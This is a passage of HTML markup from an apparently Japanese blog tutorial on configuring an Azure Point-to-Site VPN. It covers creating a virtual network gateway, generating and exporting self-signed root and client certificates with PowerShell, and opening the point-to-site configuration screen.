    style=&quot;padding-bottom: 77.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAABxklEQVQ4y61TC2/eIAzk//+9VWsntdI2bcsbEgIk5HXzsfApa9WHpiGdYoixz2ejSj3iR2uhx4DvnUdlHIbR49h3HACO47gB5/6tpe7uPuHLwwOqqkJT13h6esT9/WdM0/QiwEeCq9cyXS9/BPmOstbChwlloxGmGeNoEWPEsiwYhgFN04A+760cWLlxRFk3KLoBRfmnbAZyzp0Ba/R9j65rJdmYzrquS8g+JHBGheJG6w5VWaQLz8vdpTkZr+1vJVNDis9sxhhpRMAgbHLmXs6M0WAV27piPbGduO23FWGOMG6CCsEjeI8pBCQ74W97egPpvxDxboTtDRTLJMiwKIrUgPdm7SrL8/FR8zyjbdskPANrrVFLY2gzeAbPmZQ2v/TJ9zjDWmTbtw1q3Q+hPCdHL6VTE45MjDP+ZSnnpSltI+NSYV2idG2T75ICUx9rh8SuFZ9cZp5RktiE1XUq1BoDtJthwga7APtFPiZgSZn5VT/uOTIvGH6rRUNjUbUavyp5FdROsmsj6O1N19tXWJEdO5t15zTwhbEfavBrcjIy3K28Cl6iBD/bAV8bh7isyZEPYJ4nKTcmmwx5vpzy8JzlK/zn9Rvm19/kFBhR6QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/9763efe3f469ddd0448c1c516dd153a1/8ac56/image-20220304201840502.webp 240w,
/static/9763efe3f469ddd0448c1c516dd153a1/d3be9/image-20220304201840502.webp 480w,
/static/9763efe3f469ddd0448c1c516dd153a1/79237/image-20220304201840502.webp 764w&quot;
              sizes=&quot;(max-width: 764px) 100vw, 764px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/9763efe3f469ddd0448c1c516dd153a1/8ff5a/image-20220304201840502.png 240w,
/static/9763efe3f469ddd0448c1c516dd153a1/e85cb/image-20220304201840502.png 480w,
/static/9763efe3f469ddd0448c1c516dd153a1/f3c12/image-20220304201840502.png 764w&quot;
            sizes=&quot;(max-width: 764px) 100vw, 764px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/9763efe3f469ddd0448c1c516dd153a1/f3c12/image-20220304201840502.png&quot;
            alt=&quot;image-20220304201840502&quot;
            title=&quot;image-20220304201840502&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;次に仮想ネットワークゲートウェイを作成しました。&lt;/p&gt;
&lt;p&gt;この時ネットワークゲートウェイサブネットのアドレス範囲に設定するアドレスは「仮想ネットワークのアドレス範囲」かつ「仮想ネットワーク内の既存のサブネットと重複しない」アドレス範囲に設定する必要があります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 755px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/19c219e1f532d0dbfc3dbcf0916e30dc/cab43/image-20220304202022318.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 99.16666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAACXUlEQVQ4y51U7XKbMBDk/Z8vf5xOp820cTAgvoWEJLjuHpDYnqTulJm1ZAF3e3t7ZE9PT3I6naQsCymKDZfLRc7ns3x7ftZ7IQThta7rQ2T8SSnJPM96cLz4v1fWNo1UVaWMQphvmDCJ906cc8qSZ8uy/AVJsq5tJcX4nuFgx5u1MZCi1IR938vsvQa/hwemacJ+ksxaKxHZWfbBjFdCxrw0UtdmZ+oVZPoZ+AyR8aHKVFKBCZnuKkpYRMoBgZC1A7sG0vDZhxpaO8olz5X2R8mrxGWVqndaBssax1HXuMvzZZdZe5hvm7FpuGi5xmwlX5f1GVRLNFA1VJ9dZdGA0LSpazFoyLzrd90Ef7P3e1MQsOs67SBvsDHHlSKacq7l9Vch+VsjboD4NirmfQ3Tvsfqcd+PaAqDaIdR4sZwC+jjKi+llaIe5NWMYsEihvhefpiDMuOZ7lEB9c3uu3SUHED25XcuP398FzsOqKKTASsrYoOGYVB9KRn3LfzMoGqb45AoMcsOetDYDEJjT3t3yWxbZ9WM73IlmGRyVrLDtDzkw+wuy5ereb6fbUpEEseEWGXcbwxJtUY3aWy3e1FfQozeBfUhEzlYQoM8MLf6kNEHzioCHpOSQDKvOnl7PUtjGnQ8l+JSih0sLLWqC24A0VNMR0CK3Sr1D9skMbmRtkKyZpTeDGqL5BdYJahdtnXfj1insBmbUGGxUkM19rrg/ygh4rMl//59VGNzZD6zz+wwUtYp6LcFpX0Flr1Ap21SgGWfko/RW6Wr8ZWpWlkCvj4uSiR82tZr4IzlEn8A4awbAE8ST9oAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/19c219e1f532d0dbfc3dbcf0916e30dc/8ac56/image-20220304202022318.webp 240w,
/static/19c219e1f532d0dbfc3dbcf0916e30dc/d3be9/image-20220304202022318.webp 480w,
/static/19c219e1f532d0dbfc3dbcf0916e30dc/a149a/image-20220304202022318.webp 755w&quot;
              sizes=&quot;(max-width: 755px) 100vw, 755px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/19c219e1f532d0dbfc3dbcf0916e30dc/8ff5a/image-20220304202022318.png 240w,
/static/19c219e1f532d0dbfc3dbcf0916e30dc/e85cb/image-20220304202022318.png 480w,
/static/19c219e1f532d0dbfc3dbcf0916e30dc/cab43/image-20220304202022318.png 755w&quot;
            sizes=&quot;(max-width: 755px) 100vw, 755px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/19c219e1f532d0dbfc3dbcf0916e30dc/cab43/image-20220304202022318.png&quot;
            alt=&quot;image-20220304202022318&quot;
            title=&quot;image-20220304202022318&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これで作成が完了したので、次は仮想ネットワークゲートウェイに適用するルート証明書を作成します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/vpn-gateway/vpn-gateway-howto-point-to-site-resource-manager-portal&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;P2S VPN と証明書認証を使用して VNet に接続する: ポータル - Azure VPN Gateway | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;オレオレルート証明書とクライアント証明書を生成する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AA%E3%83%AC%E3%82%AA%E3%83%AC%E3%83%AB%E3%83%BC%E3%83%88%E8%A8%BC%E6%98%8E%E6%9B%B8%E3%81%A8%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E8%A8%BC%E6%98%8E%E6%9B%B8%E3%82%92%E7%94%9F%E6%88%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;オレオレルート証明書とクライアント証明書を生成する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;オレオレルート証明書とクライアント証明書を生成する&lt;/h2&gt;
&lt;p&gt;仮想ネットワークゲートウェイを使用してVPN接続を行うために、クライアント側のWindowsでオレオレ証明書を作成します。&lt;/p&gt;
&lt;p&gt;以下の公式ドキュメントの手順の通りに実施すればOKです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/vpn-gateway/vpn-gateway-certificates-point-to-site&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;P2S 用の証明書を生成してエクスポートする: PowerShell - Azure VPN Gateway | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;まずは管理者権限で起動したPowershellで以下のコマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$cert&lt;/span&gt; = &lt;span class=&quot;token function&quot;&gt;New-SelfSignedCertificate&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Type&lt;/span&gt; Custom &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;KeySpec Signature `
&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Subject &lt;span class=&quot;token string&quot;&gt;&quot;CN=P2SRootCert&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;KeyExportPolicy Exportable `
&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;HashAlgorithm sha256 &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;KeyLength 2048 `
&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;CertStoreLocation &lt;span class=&quot;token string&quot;&gt;&quot;Cert:\CurrentUser\My&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;KeyUsageProperty Sign &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;KeyUsage CertSign&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これでオレオレルート証明書が作成できたので、このままクライアント証明書も作成します。&lt;/p&gt;
&lt;p&gt;同じPowershellセッションで以下のコマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token function&quot;&gt;New-SelfSignedCertificate&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Type&lt;/span&gt; Custom &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;DnsName P2SChildCert &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;KeySpec Signature `
&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Subject &lt;span class=&quot;token string&quot;&gt;&quot;CN=P2SChildCert&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;KeyExportPolicy Exportable `
&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;HashAlgorithm sha256 &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;KeyLength 2048 `
&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;CertStoreLocation &lt;span class=&quot;token string&quot;&gt;&quot;Cert:\CurrentUser\My&quot;&lt;/span&gt; `
&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Signer &lt;span class=&quot;token variable&quot;&gt;$cert&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;TextExtension @&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;2.5.29.37={text}1.3.6.1.5.5.7.3.2&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;成功すると以下のような画面になります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/194ee083b47c67d0f91560b7aa6071b3/709cb/image-20220304203105251.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 25.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7UlEQVQY022PW2+CQBSE10ZWRbDa1F5ieUApKqJIW0KqIVx3jf3//2c8C9j44MOXmZPsmTPL7N8zrB+JV+ItPuP9cMLTdworzmAfS0yCFM/7EtP9CUOvAl/m6K8KGJuqnjU3ByeU769LsGkoYHoZBmEC089hbivoPrET6BJMPVoWRA5Gi8p3HNJ51rBouc6PgYDhSwqT0DcCQ0J5g1T3mhaqjd6q6QtqLaGpIxSkwm9hdizxEhTofSbQFoSTgJPnpD03xSz6qwM4BWhuga7baL18L9BwIjx8fNV0ZmHD1VsRRluJMaGa/n+v5V7oBXKPkC7zRjjmAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/194ee083b47c67d0f91560b7aa6071b3/8ac56/image-20220304203105251.webp 240w,
/static/194ee083b47c67d0f91560b7aa6071b3/d3be9/image-20220304203105251.webp 480w,
/static/194ee083b47c67d0f91560b7aa6071b3/e46b2/image-20220304203105251.webp 960w,
/static/194ee083b47c67d0f91560b7aa6071b3/43c62/image-20220304203105251.webp 1034w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/194ee083b47c67d0f91560b7aa6071b3/8ff5a/image-20220304203105251.png 240w,
/static/194ee083b47c67d0f91560b7aa6071b3/e85cb/image-20220304203105251.png 480w,
/static/194ee083b47c67d0f91560b7aa6071b3/d9199/image-20220304203105251.png 960w,
/static/194ee083b47c67d0f91560b7aa6071b3/709cb/image-20220304203105251.png 1034w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/194ee083b47c67d0f91560b7aa6071b3/d9199/image-20220304203105251.png&quot;
            alt=&quot;image-20220304203105251&quot;
            title=&quot;image-20220304203105251&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Windows上で証明書ストアを参照してみると、以下の2つの証明書が登録されていました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/b5c43c4ff1c25d259cc948972ffe094d/cdef6/image-20220304203801460.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5ElEQVQY03WOy07CUBRF+9/GGeEhkmugipWfcECC1UE1DUqQ+AIMA56mURMUXwFLW1me2zpg4mDn3L3PPivXGFdTeE6efi3N0E7z6GwzPMryUlcEt/ssb8r/an3vXyfT8NwiUzePd6r4aCieXSUwEzoHBFIK9KEuiyIBrGf+1V78TnYWoQa+nWXoHW7w5BQI5WB+WeLBTvFa34l9DJbi5DjLvLXLSrzWomUytjN8C3Qm3dl50jeWzS0G1U1Gdo7JSU6AJp8XivdGkahtQbfCjwC018fcV+IsurP4apYIZfp/v9X5L/joCMlYBDZrAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/b5c43c4ff1c25d259cc948972ffe094d/8ac56/image-20220304203801460.webp 240w,
/static/b5c43c4ff1c25d259cc948972ffe094d/d3be9/image-20220304203801460.webp 480w,
/static/b5c43c4ff1c25d259cc948972ffe094d/e46b2/image-20220304203801460.webp 960w,
/static/b5c43c4ff1c25d259cc948972ffe094d/5231b/image-20220304203801460.webp 1163w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/b5c43c4ff1c25d259cc948972ffe094d/8ff5a/image-20220304203801460.png 240w,
/static/b5c43c4ff1c25d259cc948972ffe094d/e85cb/image-20220304203801460.png 480w,
/static/b5c43c4ff1c25d259cc948972ffe094d/d9199/image-20220304203801460.png 960w,
/static/b5c43c4ff1c25d259cc948972ffe094d/cdef6/image-20220304203801460.png 1163w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/b5c43c4ff1c25d259cc948972ffe094d/d9199/image-20220304203801460.png&quot;
            alt=&quot;image-20220304203801460&quot;
            title=&quot;image-20220304203801460&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;このうち、「P2SRootCert」という名前のルート証明書からcerファイルをエクスポートします。&lt;/p&gt;
&lt;p&gt;ルート証明書を右クリックしてエクスポートを選択し、「Base64 Encode~」を選択して進みます。&lt;/p&gt;
&lt;p&gt;最終的に以下のような設定でエクスポートします。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 473px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/46960aabb8a03d1d20ca4efd91ff8d5a/c7c3c/image-20220304203933730.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 91.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC/ElEQVQ4y51UW1cSURjlr9XqwdVfMFcr3+ulVQ+1ViWCIAyXmeEiAlarC48tDcm74hW8l4iIZomCkCiioZbA7jszCIO9WA+b7xzmnD3fZe9RHYV4fB/UIzHUjr2gCbkZAfmwiP1JC45CQhXZKQtyFDMTZvwYN0vnyhE3sNpJsZOiW4Iq5lfD73yAgPM+hryPEPmgxppfg5DvKZJjJmwN6LDeq8HXfj2So0bM+J4g+OoxJWAkAo9EVkeIqAdY76rAC6x5ZMQUa+WeRQZ2T8pOzhKRvwivEETdlcj23hqR8gwR1LKToyof5rEZ0GCrT48s9e2AkJ204pj6yPa5aR4Z6m1qlCMYkaH+sX4eTFlx8cVVJS1fZigNhfq0PWjA/oQFh3QwHxJRmLOBPWOR/Z8cMSI9xuGQXpAOcvQSM34tdSgIZaikcuIvK+Ww3lRiBWVlyVeel4isGKmBZakqzApIBdRI+J8jM6DBDsX9wVYcDmlxPKYnAsoiTqWtK7DWISPmqgf1UZUgPTVxRjQarWgyW3CrlaA242aLGTdemNCg5dHQVsNtnYBm3o57vIg7ZhHNFhF3rQIaOQHfgpRhivql93IweAVoOzk8FDg884jQve2oQ9sbBie0rx0wdPHguiywvbfD4bPD7nNAfGfH3pQLqrMFO7LDWqT7NciNtCM/qsPvkAlYFoElHsWwGefTRpRmLcACD3y2oUjrwiRHraD+btB0NynG3bhYdlIP5+1Y7VEj3qtFYtiEjYBWckFmwipZMebXItItu2fzkx7pcYtkvzRN+eeCA2c06dNFJwpsTVF1vuQgTcm62h5sx+6wAeVVT22qTPRxhZNI8LtUSYoktEtSYr7eoXvJYQ4sOSJ0ympnzojKzlDqqqRA1bfRSwcpHEUSYrqUCIsrrjqC8n+gtNJJhFQy+5G8qPTodRF1V78yTNQS4dmiA6fzNpzMiv+E47CAc7pbJj8zMLJzNpQT+ghs97Uh/pEm3XN9xLpbkCL/n8zwEjI0oMKcHX8A78KQdb7lPQ0AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/46960aabb8a03d1d20ca4efd91ff8d5a/8ac56/image-20220304203933730.webp 240w,
/static/46960aabb8a03d1d20ca4efd91ff8d5a/7124e/image-20220304203933730.webp 473w&quot;
              sizes=&quot;(max-width: 473px) 100vw, 473px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/46960aabb8a03d1d20ca4efd91ff8d5a/8ff5a/image-20220304203933730.png 240w,
/static/46960aabb8a03d1d20ca4efd91ff8d5a/c7c3c/image-20220304203933730.png 473w&quot;
            sizes=&quot;(max-width: 473px) 100vw, 473px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/46960aabb8a03d1d20ca4efd91ff8d5a/c7c3c/image-20220304203933730.png&quot;
            alt=&quot;image-20220304203933730&quot;
            title=&quot;image-20220304203933730&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;エクスポートされたcerファイルの&lt;code class=&quot;language-text&quot;&gt;BEGIN CERTIFICATE&lt;/code&gt;の次の行から書かれている鍵の中身をコピーしておきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;-----BEGIN CERTIFICATE-----
&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;この中身をコピー&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
-----END CERTIFICATE-----&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;p2s-vpn接続を構成する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#p2s-vpn%E6%8E%A5%E7%B6%9A%E3%82%92%E6%A7%8B%E6%88%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;p2s vpn接続を構成する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;P2S VPN接続を構成する&lt;/h2&gt;
&lt;p&gt;仮想ネットワークゲートウェイの画面から「ポイント対サイトの構成」を開きます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 581px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8a89e3e28bfcab709b0e7a873e089fd1/92d15/image-20220304204212568.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 68.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAABi0lEQVQ4y51TaW+DMAzN//9Z28eu6tCkHpNKOQorBcJ9F97sbJlQV6lqLVkhxu89x07EYudh/WHg3TDw+vqC3XaLzXqN5fINBsV4b1kHcguu66i9ae7hOA5WqxUWiwWqqsI0TcqFFZaIwwBFUSDLMiRJgq7rMAwD+r5H27a4XC4qeRxHtbLp/TzGJmQcQcaxImMidiZpmuYnmZJYTIu0FGehuq7Vnp1zGZMnEsLxPBWYK2rVPM9RlSWyVKpkFnZsGxGtURQhTVNVvfaBhEQQxQrUkAKr6eOw+SSWZAUOYQEzyEm4JvIUJeWzc5XXJoqyUmrsDJgTHo9HEqI2jEAzTLhlehh/QymJUEqphsGq+ocm7LpWQ/+B5wPS3yIKY9Vk7gH37rpCbvY8NgffMuH7ngL6vq+qvEd4zwRXd6snTxOegjNNt1fH1cfm9WlC/xRg/CW4No+uzcOEtm3R0wvpfiWIwjPyLEVTV+Q1+B+/kIcIv3gojg2XwJ+7DV1mFxm9ilTGMPd7IuwfIvwGJ29AqTzHzX8AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8a89e3e28bfcab709b0e7a873e089fd1/8ac56/image-20220304204212568.webp 240w,
/static/8a89e3e28bfcab709b0e7a873e089fd1/d3be9/image-20220304204212568.webp 480w,
/static/8a89e3e28bfcab709b0e7a873e089fd1/39daa/image-20220304204212568.webp 581w&quot;
              sizes=&quot;(max-width: 581px) 100vw, 581px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8a89e3e28bfcab709b0e7a873e089fd1/8ff5a/image-20220304204212568.png 240w,
/static/8a89e3e28bfcab709b0e7a873e089fd1/e85cb/image-20220304204212568.png 480w,
/static/8a89e3e28bfcab709b0e7a873e089fd1/92d15/image-20220304204212568.png 581w&quot;
            sizes=&quot;(max-width: 581px) 100vw, 581px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8a89e3e28bfcab709b0e7a873e089fd1/92d15/image-20220304204212568.png&quot;
            alt=&quot;image-20220304204212568&quot;
            title=&quot;image-20220304204212568&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここから「今すぐ構成」をクリックし、設定画面に進みます。&lt;/p&gt;
&lt;p&gt;アドレスプールには仮想ネットワークのレンジに含まれるアドレスプールを指定します。&lt;/p&gt;
&lt;p&gt;また、トンネルの種類は特に問題がなければ&lt;code class=&quot;language-text&quot;&gt;IKEv2&lt;/code&gt;にするのが良いと思います。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4cf7cb7d01a1def6252ca3065e197ac9/218a4/image-20220304204407809.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
